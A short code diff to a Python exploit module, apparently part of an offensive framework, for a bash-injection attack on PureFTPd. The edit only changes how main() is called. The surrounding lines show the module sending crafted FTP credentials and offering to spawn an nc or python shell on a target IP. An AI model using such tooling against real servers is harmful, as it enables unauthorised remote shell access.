@@ -20,8 +20,8 @@ class pureftpdBashInjectionMenu(core.Exploit):
         s.send("PASS " + p)
         s.recv(1024)
         self.disconnect(s)
-def main():
+def main(s):
   pureftpdbashinjectionmenu = pureftpdBashInjectionMenu("pureftpd_bash_injection", "Linux x86 and x64", "", {"host":"", "rpath":"/bin", "shell":""}, {"host":"the IP of the target", "rpath":"the remote path utilities (sh, ps, etc.) are in", "shell":"(nc/python) the type of shell to spawn"})
-  pureftpdbashinjectionmenu.cmdloop("pdf-console attack(pureftpd_bash_injection)% ")
+  pureftpdbashinjectionmenu.cmdloop()
 if __name__ == '__main__':
-  main()
+  main("")
